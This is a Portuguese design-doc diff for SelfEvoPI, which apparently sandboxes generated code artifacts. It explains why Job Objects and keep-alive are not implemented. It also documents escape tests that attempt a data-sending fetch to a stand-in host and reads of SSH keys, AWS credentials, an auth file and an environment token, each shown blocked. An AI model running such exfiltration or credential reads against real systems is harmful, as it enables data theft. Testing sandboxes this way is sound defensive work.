@@ -1,7 +1,7 @@
 # Fase 2 — Sandbox Windows e Governança
 
 > **Escopo:** as três camadas de isolamento do SelfEvoPI e a política de processos.
-> **Implementado:** `core/sandbox/static-gate.mjs` (camada 1) e `core/sandbox/run-sandboxed.mjs` (camada 2). Camada 3 é especificação.
+> **Implementado:** `core/sandbox/static-gate.mjs` (camada 1), `core/sandbox/run-sandboxed.mjs` (camada 2) e `core/sandbox/escape.test.mjs` (prova de bloqueio). Camada 3 e keep-alive: veredito na §4.
 
 ## 1. Por que três camadas
 
@@ -132,6 +132,25 @@ Contenção, não cofre. O modelo é um cinto de segurança para código confiá
 - `TerminateJobObject` encerra a árvore inteira de uma vez.
 - Evita o problema clássico do Windows: processo filho preso mantendo arquivo aberto e travando o NTFS.
 
+### Veredito: Job Objects não implementado (e por quê)
+
+Node não tem binding nativo para Job Objects. Existe um caminho **sem dependência npm** — PowerShell com `Add-Type` e P/Invoke para `kernel32!CreateJobObject` — e ele foi medido nesta máquina:
+
+| Etapa | Custo medido |
+|:---|:---|
+| `Add-Type` + `CreateJobObject` (dentro do script) | **405 ms** |
+| processo `powershell.exe` inteiro, ida e volta | **774 ms** |
+
+Três motivos para não pagar esse custo agora:
+
+1. **Ganho alcançável: zero.** O `child_process` é negado pelo Permission Model (§6 prova: `spawnSync` morre com `ERR_ACCESS_DENIED`). Sem processo filho, a árvore tem profundidade 1 — e `taskkill /PID <pid> /T /F` já encerra profundidade 1 de forma determinística. Job Object só ganha de `taskkill /T` quando existe **neto órfão** (pai morto no meio), e neto é justamente o que não existe aqui.
+2. **Custo por execução.** 774 ms a mais em toda chamada ao sandbox, contra os ~150 ms que um artefato simples custa hoje. A suíte inteira levaria ~6x mais tempo, e o loop evolutivo paga isso em cada artefato.
+3. **Mudança de arquitetura.** Para o job conter o processo, o `node` teria de nascer **filho do helper** PowerShell — ou seja, a raiz da árvore deixa de ser o runner, e stdout/stderr/exit code passam por um terceiro processo. É mais uma superfície de falha para fechar um buraco que não existe.
+
+**O que mudaria a decisão:** liberar `child_process` para alguma classe de artefato, adotar keep-alive (que por definição deixa netos vivos), ou aparecer um caso real de neto órfão. Qualquer um desses, e o Job Object passa a ser a única coisa que alcança o processo — aí os 774 ms se pagam.
+
+**Enquanto isso:** o encerramento é `taskkill /PID <pid> /T /F`, chamado no timeout e disponível para o supervisor encerrar sob demanda.
+
 ### Política de keep-alive por tarefa
 
 Este é o ponto onde a maioria dos harnesses erra. Encerrar a árvore inteira **sempre** parece seguro, mas quebra tarefas legítimas:
@@ -142,10 +161,20 @@ A política do SelfEvoPI é **por tarefa**:
 
 | Modo | Quando | Comportamento |
 |:---|:---|:---|
-| `kill-tree` | padrão | Job Object encerra tudo ao fim da tarefa |
-| `keep-alive` | tarefa que deixa serviço no ar | o job sobrevive; um coletor decide quando encerrar |
+| `kill-tree` | padrão | `taskkill /PID <pid> /T /F` encerra a árvore ao fim da tarefa |
+| `keep-alive` | tarefa que deixa serviço no ar | o processo sobrevive; um coletor decide quando encerrar (não implementado — ver abaixo) |
 
 A decisão pertence a quem declara a tarefa, não ao sandbox. O sandbox executa a política; não a inventa.
+
+### Veredito: keep-alive não implementado (e por quê)
+
+O ganho é real e está medido na pesquisa (`docs/research/inspiracoes.md` §2.17). Mesmo assim, `runSandboxed` **não** ganha uma opção `keepAlive`. Três motivos, em ordem de peso:
+
+1. **Quebra o contrato.** Hoje o runner chama `runSandboxed(...)` e recebe `{ ok, exitCode, stdout, stderr, durationMs }` quando o processo **termina**. Um processo mantido vivo não termina: seria preciso devolver o `pid` antes do fim, perder `stdout/stderr` e transformar a função em outra coisa — um supervisor, não um executor.
+2. **É o oposto do que a peça existe para fazer.** O runner é a limpeza. Uma opção que desliga a limpeza por padrão seguro é um vazamento esperando para acontecer; o padrão continua sendo `taskkill /T /F` no timeout e nada sobra.
+3. **O mecanismo já existe, separado.** `runSandboxed` devolve `pid`, e `taskkill /PID <pid> /T /F` encerra a árvore sob demanda. Quem adota o processo entre tarefas é o supervisor, que tem o ciclo de vida, a fila e o grader.
+
+**O que seria preciso para implementar:** um `startSandboxed()` que devolva `{ pid, stdout, stderr }` com um stream contínuo, um `killSandboxed(pid)` no mesmo mecanismo, e um dono do processo no coordenador — com o `keep-alive` declarado na tarefa e auditado no ledger. Isso é uma peça nova, não uma flag.
 
 ## 5. Como as camadas se combinam
 
@@ -156,12 +185,52 @@ artefato gerado
    │                            warn? segue com registro
    ├─ 2. node --permission ──► fs restrito ao worktree, sem filho, preload fecha a rede
    │                            timeout ⇒ taskkill /T /F na árvore
-   └─ 3. Job Object ─────────► kill-tree ou keep-alive, conforme a tarefa
+   └─ 3. Job Object (spec) ──► kill-tree ou keep-alive, conforme a tarefa
 ```
 
 Um artefato só é promovido se passar nas três. Falhar em qualquer uma devolve o artefato ao loop com o motivo, e o gatekeeper registra a regressão.
 
-## 6. Estado
+## 6. Prova de bloqueio — `core/sandbox/escape.test.mjs`
+
+A suíte comum prova que o gate **classifica**. Este arquivo prova que o processo **não sai**. Cada caso é um artefato malicioso real, rodado duas vezes: com o gate ligado (caminho de produção) e com `precheck: false`, para isolar a camada 2 — se o runtime deixasse passar, o artefato passaria na segunda.
+
+```powershell
+node --test core/sandbox/escape.test.mjs    # 8 passam
+```
+
+| Tentativa | Camada que barrou | Evidência (stderr, com `precheck: false`) |
+|:---|:---|:---|
+| `fetch("https://example.invalid/collect?d=1")` | gate + runtime | `Error: SelfEvoPI sandbox: fetch bloqueado` |
+| ler `C:/Windows/System32/drivers/etc/hosts` | **runtime** | `Access to this API has been restricted. Use --allow-fs-read` |
+| escrever em `os.homedir()` | **runtime** | `Access to this API has been restricted. Use --allow-fs-write` |
+| `spawnSync("node", ["-e", "…"])` | gate + runtime | `Access to this API has been restricted. Use --allow-child-process` |
+| ler `~/.ssh/id_rsa` | gate + runtime | `Access to this API has been restricted. Use --allow-fs-read` |
+| ler `~/.aws/credentials` | **runtime** | `Access to this API has been restricted. Use --allow-fs-read` |
+| ler `~/.config/opencode/auth.json` | gate + runtime | `Access to this API has been restricted. Use --allow-fs-read` |
+| ler `process.env.SELFEVOPI_FAKE_TOKEN` | gate + runtime | gate barra o nome; com `precheck: false` o filho imprime `TOKEN null` (ambiente mínimo) |
+
+Onde está cada caso em `core/sandbox/escape.test.mjs`:
+
+| Caso | Linha |
+|:---|:---|
+| rede (`fetch`) | 105 |
+| disco externo — leitura | 135 |
+| disco externo — escrita no home | 168 |
+| subprocesso (`spawnSync`) | 201 |
+| credenciais (`ssh`, `aws`, config do PI) | 229 (laço sobre `CASOS_DE_CREDENCIAL`) |
+| ambiente (segredo do pai) | 283 |
+
+Três linhas merecem leitura:
+
+- **`.aws/credentials` só é barrado pelo runtime.** O gate não tem regra para `.aws` — é regra faltando, não decisão. Se um dia o Permission Model sair de cena, esse buraco abre.
+- **O nome `SELFEVOPI_FAKE_TOKEN` é barrado duas vezes.** O gate recusa o nome (é leitura de segredo) e, com o gate desligado, o filho ainda não vê a variável: o runner passa uma allowlist de ambiente, não o process.env do harness. É a única linha em que as duas camadas agem por motivos diferentes.
+- **Ler o hosts do Windows é aviso, não bloqueio, no gate.** O caminho externo é detectado e registrado; quem impede a leitura é a camada 2. É a divisão certa: o gate sabe que é suspeito, o runtime sabe se é possível.
+
+O teste também verifica o que **não** aconteceu: o `fetch` não pode produzir `STATUS 200` no stdout, e o arquivo no home tem de continuar inexistente. Recusar a saída de erro é fácil; provar a **ausência do efeito** é o que fecha o caso.
+
+Nenhum caso passou. Não há buraco aberto nesta rodada.
+
+## 7. Estado
 
 | Item | Estado |
 |:---|:---|
@@ -169,19 +238,21 @@ Um artefato só é promovido se passar nas três. Falhar em qualquer uma devolve
 | Classificação de caminho | implementado |
 | Máscara de comentários/literais | implementado |
 | Camada 2 (Permission Model + preload + taskkill) | implementado, 15 testes |
-| Camada 3 (Job Objects) | especificada |
-| Política keep-alive | definida, não implementada |
+| Camada 2 — prova de bloqueio | implementado, 8 casos (`escape.test.mjs`) |
+| Camada 3 (Job Objects) | **não implementado**, com motivo medido (§4) |
+| Política keep-alive | **não implementado**, com motivo (§4) |
 
 ### Comandos
 
 ```powershell
 node --test core/sandbox/static-gate.test.mjs      # 44 passam
 node --test core/sandbox/run-sandboxed.test.mjs    # 15 passam
+node --test core/sandbox/escape.test.mjs           # 8 passam (prova de bloqueio)
 ```
 
-O teste de timeout mata a árvore e confirma no `after()` que nenhum pid sobreviveu; se sobrasse um, a suíte falha.
+O teste de timeout mata a árvore e confirma no `after()` que nenhum pid sobreviveu; se sobrasse um, a suíte falha. O `escape.test.mjs` prova o efeito, não só a classificação: stdout sem `STATUS 200` e arquivo no home inexistente.
 
-## 7. Decisão: `verify.mjs` é código do harness, não do artefato
+## 8. Decisão: `verify.mjs` é código do harness, não do artefato
 
 O Forge (A5) gera três arquivos por artefato: `cli.mjs` (ou `SKILL.md`), `README.md` e **`verify.mjs`**. O `verify.mjs` executa os testes do pedido e, para isso, usa `spawnSync` — que o gate estático bloqueia como `child-process` (severidade `block`).
 
